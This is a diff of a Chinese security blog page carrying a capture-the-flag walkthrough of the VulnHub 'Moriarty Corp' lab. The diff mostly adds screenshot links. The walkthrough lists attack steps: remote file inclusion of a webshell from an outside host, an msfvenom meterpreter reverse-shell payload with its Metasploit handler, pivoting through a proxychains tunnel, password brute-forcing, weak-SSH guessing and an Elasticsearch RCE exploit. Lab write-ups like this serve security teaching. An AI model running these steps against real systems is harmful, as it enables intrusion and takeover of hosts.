@@ -301,19 +301,19 @@
         </a>
         
         <a  class="web渗透 "
-           href="/2019/04/01/web%E5%AE%89%E5%85%A8-xxe/"
-           data-tag="web渗透"
-           data-author="" >
-            <span class="post-title" title="外部实体注入">外部实体注入</span>
-            <span class="post-date" title="2019-04-01 00:00:00">2019/04/01</span>
-        </a>
-        
-        <a  class="web渗透 "
            href="/2019/03/09/web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"
            data-tag="web渗透"
            data-author="" >
             <span class="post-title" title="文件上传漏洞">文件上传漏洞</span>
             <span class="post-date" title="2019-03-09 00:00:00">2019/03/09</span>
+        </a>
+        
+        <a  class="web渗透 "
+           href="/2019/04/01/web%E5%AE%89%E5%85%A8-xxe/"
+           data-tag="web渗透"
+           data-author="" >
+            <span class="post-title" title="外部实体注入">外部实体注入</span>
+            <span class="post-date" title="2019-04-01 00:00:00">2019/04/01</span>
         </a>
         
         <a  class="web渗透 "
@@ -384,7 +384,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-06-07 14:14:20'>2020-06-07 14:14</time>
+        创建时间:<time class="date" title='更新时间: 2020-06-07 14:38:50'>2020-06-07 14:14</time>
         
     </div>
     <div class="article-meta">
@@ -406,7 +406,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-靶场环境"><span class="toc-text">1. 靶场环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-主机发现"><span class="toc-text">2. 主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-文件包含"><span class="toc-text">3. 文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Payload反弹"><span class="toc-text">4. Payload反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-添加代理"><span class="toc-text">5. 添加代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-暴力破解"><span class="toc-text">7. 暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-文件上传"><span class="toc-text">8. 文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-SSH弱口令"><span class="toc-text">9. SSH弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-任意用户密码修改"><span class="toc-text">10. 任意用户密码修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-远程代码执行"><span class="toc-text">11. 远程代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-个人总结"><span class="toc-text">12. 个人总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-靶场环境"><span class="toc-text">1. 靶场环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-主机发现"><span class="toc-text">2. 主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-文件包含"><span class="toc-text">3. 文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Payload反弹"><span class="toc-text">4. Payload反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-添加代理"><span class="toc-text">5. 添加代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-内网探测"><span class="toc-text">6. 内网探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-暴力破解"><span class="toc-text">7. 暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-文件上传"><span class="toc-text">8. 文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-SSH弱口令"><span class="toc-text">9. SSH弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-任意用户密码修改"><span class="toc-text">10. 任意用户密码修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-远程代码执行"><span class="toc-text">11. 远程代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-个人总结"><span class="toc-text">12. 个人总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -429,71 +429,56 @@
 4. payload反弹           10. 任意用户密码修改
 5. 添加代理               11. 远程代码执行
 6. 内网探测               12. 个人总结</code></pre>
-<h2 id="1-靶场环境"><a href="#1-靶场环境" class="headerlink" title="1. 靶场环境"></a>1. 靶场环境</h2><p>本次所使用的攻击机为kali linux系统，攻击过程中涉及到的工具主要有：公网主机VPS，中国菜刀/中国蚂剑，burpsuite，metasploit，MobaXterm，一句话木马，proxychains，nmap，searchsploit，exp脚本等。攻击的拓扑结构如下图所示。</p>
-<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/1.png" alt=""></p>
+<h2 id="1-靶场环境"><a href="#1-靶场环境" class="headerlink" title="1. 靶场环境"></a>1. 靶场环境</h2><p>本次所使用的攻击机为kali linux系统，攻击过程中涉及到的工具主要有：公网主机VPS，中国菜刀/中国蚂剑，burpsuite，metasploit，MobaXterm，一句话木马，proxychains，nmap，searchsploit，exp脚本等。攻击的拓扑结构如下图所示。<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/1.png" alt=""></p>
 <p><strong>注意:</strong><br>外网服务器(8000端口)为提交<code>flag</code>以及攻击提示处，并不存在漏洞，请不要进行攻击行为。<code>flag</code>的存储格式为<code>#_flag.txt</code>，通常存储在服务器的不同目录下面。每次提交<code>flag</code>后都会给相关提示和说明。开始渗透之前须向外网服务器(8000端口)提交<code>flag{start}</code>，表示攻击开始正常启动。本次实验的虚拟机采用<code>virtual box</code>.<br>详细靶场说明请参考：<br><a href="https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/</a><br>靶场下载地址：<br>Download (Mirror):<br><a href="https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova" target="_blank" rel="noopener">https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova</a><br>Download (Torrent):<br><a href="https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova.torrent</a></p>
 <h2 id="2-主机发现"><a href="#2-主机发现" class="headerlink" title="2. 主机发现"></a>2. 主机发现</h2><p>通过arp(地址解析协议)进行局域网内主机发现，arp是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间。</p>
 <pre><code class="lsl">&gt;&gt;&gt; namp -sn -PR -T 4 192.168.124.0/24
 -sn：只进行主机发现，不进行端口扫描。
 -PR：ARP Ping。
 -T：指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，在网络通讯状况较好的情况下推荐使用T4。</code></pre>
-<h2 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3. 文件包含"></a>3. 文件包含</h2><p>通过访问页面形式为 <code>http://192.168.124.14/file=name.html</code>，可猜测为目录遍历或者文件包含漏洞，如下为漏洞验证结果。</p>
-<p>文件包含漏洞，通常分为本地文件包含和远程文件包含。本地文件包含，通常需要能够写入webshell的文件进行包含，进而获取shell权限。远程文件包含，可对远程写入webshell的文件进行包含，获取shell权限。如下为远程服务器test.txt文件写入phpinfo();</p>
-<p>访问页面对远程主机的test.txt文件进行包含，验证远程文件漏洞真实存在。这样可以在远程服务器写入webshell进行包含，进而获取Moriarty Corp服务器的主机shell权限。</p>
-<p>如下所示，通过菜刀直接连接后，可以获取到shell权限。通过查看目录,在根目录查看到1_flag.txt。<br>木马文件链接地址：<code>http://192.168.124.14/?file=http://xx.xx.xx.xx/snail.txt</code></p>
-<p>将获取到的flag内容进行提交后，Moriarty Corp靶场给出新的提示。如下图所示，提示内网环境中存在重要的网站，里面存在要获取的flag信息，并且告知内网范围在172.17.0.3-254段。由此，开始步入后渗透攻击阶段，由于靶场环境主要以linux系统环境为主，故此处后渗透工具在此处选择metasploit工具为主。</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/2.png" alt=""></p>
+<h2 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3. 文件包含"></a>3. 文件包含</h2><p>通过访问页面形式为 <code>http://192.168.124.14/file=name.html</code>，可猜测为目录遍历或者文件包含漏洞，如下为漏洞验证结果。<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/3.png" alt=""><br>文件包含漏洞，通常分为本地文件包含和远程文件包含。本地文件包含，通常需要能够写入webshell的文件进行包含，进而获取shell权限。远程文件包含，可对远程写入webshell的文件进行包含，获取shell权限。如下为远程服务器test.txt文件写入phpinfo();<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/4.png" alt=""><br>访问页面对远程主机的test.txt文件进行包含，验证远程文件漏洞真实存在。这样可以在远程服务器写入webshell进行包含，进而获取Moriarty Corp服务器的主机shell权限。<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/5.png" alt=""><br>如下所示，通过菜刀直接连接后，可以获取到shell权限。通过查看目录,在根目录查看到1_flag.txt。<br>木马文件链接地址：<code>http://192.168.124.14/?file=http://xx.xx.xx.xx/snail.txt</code><br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/6.png" alt=""><br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/7.png" alt=""><br>将获取到的flag内容进行提交后，Moriarty Corp靶场给出新的提示。如下图所示，提示内网环境中存在重要的网站，里面存在要获取的flag信息，并且告知内网范围在172.17.0.3-254段。由此，开始步入后渗透攻击阶段，由于靶场环境主要以linux系统环境为主，故此处后渗透工具在此处选择metasploit工具为主。<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/8.png" alt=""></p>
 <h2 id="4-Payload反弹"><a href="#4-Payload反弹" class="headerlink" title="4. Payload反弹"></a>4. Payload反弹</h2><p>攻击机进行监听设置(注意：监听主机设置需要与生成的payload保持一致)：</p>
 <pre><code class="shell">&gt;&gt;&gt; use exploit/multi/handler
 &gt;&gt;&gt; set payloads linux/x64/meterpreter_reverse_tcp
 &gt;&gt;&gt; set LHOST 192.168.124.15        #监听主机ip地址
 &gt;&gt;&gt; set PORT 9999                  #监听主机端口号
 &gt;&gt;&gt; exploit -j</code></pre>
-<p>生成反弹需要的payload文件：</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/9.png" alt=""><br>生成反弹需要的payload文件：</p>
 <pre><code class="shell">&gt;&gt;&gt; msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP LPORT =PORT -f elf &gt; shell.elf</code></pre>
-<p>将生成的文件上传到目标主机，并更改payload可执行权限，并执行。</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/10.png" alt=""><br>将生成的文件上传到目标主机，并更改payload可执行权限，并执行。</p>
 <pre><code class="dockerfile">&gt;&gt;&gt; chmod 777 shell.elf
 &gt;&gt;&gt; ./shell.elf</code></pre>
-<p>在攻击端，监听的主机收到目标主机反弹的shell权限，如下图所示：</p>
-<h2 id="5-添加代理"><a href="#5-添加代理" class="headerlink" title="5. 添加代理"></a>5. 添加代理</h2><p>根据提交flag后系统反馈的提示说明，需要我们对内网的web应用网站进行渗透攻击，此时为了能够访问到内网，需要进行添加代理操作。查看当前路由有一个内网段ip地址段位172.17.0.0/24。</p>
-<p>执行指令添加路由操作。</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/11.png" alt=""><br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/12.png" alt=""><br>在攻击端，监听的主机收到目标主机反弹的shell权限，如下图所示：<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/13.png" alt=""></p>
+<h2 id="5-添加代理"><a href="#5-添加代理" class="headerlink" title="5. 添加代理"></a>5. 添加代理</h2><p>根据提交flag后系统反馈的提示说明，需要我们对内网的web应用网站进行渗透攻击，此时为了能够访问到内网，需要进行添加代理操作。查看当前路由有一个内网段ip地址段位172.17.0.0/24。<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/14.png" alt=""><br>执行指令添加路由操作。</p>
 <pre><code class="lsl">&gt;&gt;&gt; run autoroute -s 172.17.0.0/24</code></pre>
-<p>添加socks5代理：</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/15.png" alt=""><br>添加socks5代理：</p>
 <pre><code class="ruby">&gt;&gt;&gt; use auxiliary/server/socks5
 &gt;&gt;&gt; run</code></pre>
-<p>此处应用proxychains工具，进行内网探测，使用编辑器在文件/etc/proxychains.conf的最后一行加入socks5代理的配置信息。<br>— snippet —<br>[ProxyList]</p>
-<pre><code class="shell"># add proxy here ...
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/16.png" alt=""><br>此处应用proxychains工具，进行内网探测，使用编辑器在文件/etc/proxychains.conf的最后一行加入socks5代理的配置信息。</p>
+<pre><code class="yaml">--- snippet ---
+[ProxyList]
+
+# add proxy here ...
 # meanwile
 # defaults set to &quot;tor&quot;
 socks5  127.0.0.1 1080</code></pre>
-<ol start="6">
-<li>内网探测<br>通过执行代理工具proxychains，对Moriarty Corp内网web服务进行探测，可以发现主机ip地址为172.17.0.4。执行指令如下所示：</li>
-</ol>
+<h2 id="6-内网探测"><a href="#6-内网探测" class="headerlink" title="6. 内网探测"></a>6. 内网探测</h2><p>通过执行代理工具proxychains，对Moriarty Corp内网web服务进行探测，可以发现主机ip地址为172.17.0.4。执行指令如下所示：</p>
 <pre><code class="lsl">&gt;&gt;&gt; Proxychains nmap 172.17.0.0/24 -sV  -sT  -Pn  -T 4 -p80 </code></pre>
-<h2 id="7-暴力破解"><a href="#7-暴力破解" class="headerlink" title="7. 暴力破解"></a>7. 暴力破解</h2><p>此时通过浏览器是不能访问到内网服务器，需要在浏览器配置代理进行访问，配置代理类型选择socks5，本地端口为1080。配置好以后，就能通过代理访问内网web应用了。</p>
-<p>通过浏览页面可发现，为一个文件上传页面，但是上传需要输入口令，方可操作成功。此时考虑可通过burpsuite进行拦截后，口令破解。</p>
-<p>打开burpsuite后，需要添加代理，这样才能将拦截到的数据正确发送到目标服务器，配置过程如下所示：</p>
-<p>对拦截的数据更改口令字段，添加常用字典，此处用的字典为：top1000.txt。查看破解成功字段的真实口令为password。</p>
-<h2 id="8-文件上传"><a href="#8-文件上传" class="headerlink" title="8. 文件上传"></a>8. 文件上传</h2><p>如下图所示，成功将木马上传至服务器：</p>
-<p>常用的菜刀，Cknife等工具并不存在代理功能，此处使用中国蚁剑工具进行连接，配置蚁剑代理如下所示：</p>
-<p>成功连接到内网的shell后，访问目标系统不同目录，获取第二个flag文件：2_flag.txt</p>
-<h2 id="9-SSH弱口令"><a href="#9-SSH弱口令" class="headerlink" title="9. SSH弱口令"></a>9. SSH弱口令</h2><p>将获取到的flag内容进行提交后，Moriarty Corp靶场给出新的提示。如下图所示，给出几个用户名和密码hash值。对内网中的ssh服务进行弱口令猜解。</p>
-<p>通过第三方网站，对给出的hash值进行破解，如下所示为破解的hash结果：</p>
-<p>对内网的22端口进行探测，发现主机172.17.0.8开放22端口，并对该内网主机进行ssh弱口令猜解。</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/17.png" alt=""></p>
+<h2 id="7-暴力破解"><a href="#7-暴力破解" class="headerlink" title="7. 暴力破解"></a>7. 暴力破解</h2><p>此时通过浏览器是不能访问到内网服务器，需要在浏览器配置代理进行访问，配置代理类型选择socks5，本地端口为1080。配置好以后，就能通过代理访问内网web应用了。<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/18.png" alt=""><br>通过浏览页面可发现，为一个文件上传页面，但是上传需要输入口令，方可操作成功。此时考虑可通过burpsuite进行拦截后，口令破解。<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/19.png" alt=""><br>打开burpsuite后，需要添加代理，这样才能将拦截到的数据正确发送到目标服务器，配置过程如下所示：<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/20.png" alt=""><br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/21.png" alt=""><br>对拦截的数据更改口令字段，添加常用字典，此处用的字典为：top1000.txt。查看破解成功字段的真实口令为password。<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/22.png" alt=""></p>
+<h2 id="8-文件上传"><a href="#8-文件上传" class="headerlink" title="8. 文件上传"></a>8. 文件上传</h2><p>如下图所示，成功将木马上传至服务器：<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/23.png" alt=""><br>常用的菜刀，Cknife等工具并不存在代理功能，此处使用中国蚁剑工具进行连接，配置蚁剑代理如下所示：<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/24.png" alt=""><br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/25.png" alt=""><br>成功连接到内网的shell后，访问目标系统不同目录，获取第二个flag文件：2_flag.txt<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/26.png" alt=""></p>
+<h2 id="9-SSH弱口令"><a href="#9-SSH弱口令" class="headerlink" title="9. SSH弱口令"></a>9. SSH弱口令</h2><p>将获取到的flag内容进行提交后，Moriarty Corp靶场给出新的提示。如下图所示，给出几个用户名和密码hash值。对内网中的ssh服务进行弱口令猜解。<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/27.png" alt=""><br>通过第三方网站，对给出的hash值进行破解，如下所示为破解的hash结果：<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/28.png" alt=""><br>对内网的22端口进行探测，发现主机172.17.0.8开放22端口，并对该内网主机进行ssh弱口令猜解。</p>
 <pre><code class="lsl">&gt;&gt;&gt; proxychains nmap -sV -t -Pn -p22 127.17.0.0/24</code></pre>
-<p>通过第三方工具MobaXterm添加代理后，远程连接到内网主机，具体操作过程如下所示：</p>
-<p>猜解成功后，获得当前内网主机的基本权限，访问目录后的3_flag.txt。查看并进行提交。</p>
-<h2 id="10-任意用户密码修改"><a href="#10-任意用户密码修改" class="headerlink" title="10. 任意用户密码修改"></a>10. 任意用户密码修改</h2><p>将获取到的flag内容进行提交后，Moriarty Corp靶场给出新的提示。如下图所示，提示说存在一个聊天网站，管理员的聊天记录可能存在有价值的信息。并给出服务器开放端口可能在443，8000，8080，8888。</p>
-<p>对内网的443，8000，8080，8888端口进行探测，发现主机172.17.0.9开放8000端口，并对该内网主机web应用进行访问。</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/29.png" alt=""><br>通过第三方工具MobaXterm添加代理后，远程连接到内网主机，具体操作过程如下所示：<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/30.png" alt=""><br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/31.png" alt=""><br>猜解成功后，获得当前内网主机的基本权限，访问目录后的3_flag.txt。查看并进行提交。<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/32.png" alt=""></p>
+<h2 id="10-任意用户密码修改"><a href="#10-任意用户密码修改" class="headerlink" title="10. 任意用户密码修改"></a>10. 任意用户密码修改</h2><p>将获取到的flag内容进行提交后，Moriarty Corp靶场给出新的提示。如下图所示，提示说存在一个聊天网站，管理员的聊天记录可能存在有价值的信息。并给出服务器开放端口可能在443，8000，8080，8888。<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/33.png" alt=""><br>对内网的443，8000，8080，8888端口进行探测，发现主机172.17.0.9开放8000端口，并对该内网主机web应用进行访问。</p>
 <pre><code class="lsl">&gt;&gt;&gt; proxychains nmap -sV -t -Pn -p443,8000,8080,8888 127.17.0.0/24</code></pre>
-<p>根据提示给出的用户名和口令进行登陆，查看网站具有两个功能，可以查看chats聊天记录，可以更改用户名密码。尝试抓包，通过更改用户名为管理员，设置口令。此时如果存在任意用户名口令更改漏洞，此时就可以把管理员登陆密码从新设置。</p>
-<p>更改后，便可以以管理员身份进行登陆了。通过访问chats可以查看到另外一个flag信息。</p>
-<p>将获取到的flag内容进行提交后，Moriarty Corp靶场给出新的提示。如下图所示，文中提到一个web应用Elasticsearch。尝试百度查询了一下，该服务默认运行在9200端口，并存在框架漏洞。</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/34.png" alt=""><br>根据提示给出的用户名和口令进行登陆，查看网站具有两个功能，可以查看chats聊天记录，可以更改用户名密码。尝试抓包，通过更改用户名为管理员，设置口令。此时如果存在任意用户名口令更改漏洞，此时就可以把管理员登陆密码从新设置。<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/35.png" alt=""><br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/36.png" alt=""><br>更改后，便可以以管理员身份进行登陆了。通过访问chats可以查看到另外一个flag信息。<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/37.png" alt=""><br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/38.png" alt=""><br>将获取到的flag内容进行提交后，Moriarty Corp靶场给出新的提示。如下图所示，文中提到一个web应用Elasticsearch。尝试百度查询了一下，该服务默认运行在9200端口，并存在框架漏洞。<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/39.png" alt=""></p>
 <h2 id="11-远程代码执行"><a href="#11-远程代码执行" class="headerlink" title="11. 远程代码执行"></a>11. 远程代码执行</h2><p>对内网的9200端口进行探测，发现主机172.17.0.10开放9200端口，并对该内网主机web应用进行访问。</p>
 <pre><code class="lsl">&gt;&gt;&gt; proxychains nmap -sV  -sT  -Pn  -p9200 127.17.0.0/24</code></pre>
-<p>依据kali自带功能searchsploit功能进行版本漏洞搜索：</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/40.png" alt=""><br>依据kali自带功能searchsploit功能进行版本漏洞搜索：</p>
 <pre><code class="ruby">&gt;&gt;&gt; searchsploit elasticsearch</code></pre>
-<p>使用36337.py脚本执行远程代码执行攻击，获取shell权限</p>
-<p>通过查看目标主机目录，获取flag信息6_flag.txt。</p>
+<p><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/41.png" alt=""><br>使用36337.py脚本执行远程代码执行攻击，获取shell权限<br><img src="http://blog.betaseclab.com/picture/Moriarty_Corp/42.png" alt=""><br>通过查看目标主机目录，获取flag信息6_flag.txt。<br> <img src="http://blog.betaseclab.com/picture/Moriarty_Corp/43.png" alt=""></p>
 <h2 id="12-个人总结"><a href="#12-个人总结" class="headerlink" title="12. 个人总结"></a>12. 个人总结</h2><p>Moriarty Corp靶场涉及到了web攻击到内网漫游的基本环节，在每一个相关环节作者都给予了提示，漏洞利用方式较为简单。提交完漏洞结束后，就像服务器提示所说被拉入黑名单了，再次访问发现已被拉黑。</p>
 
       
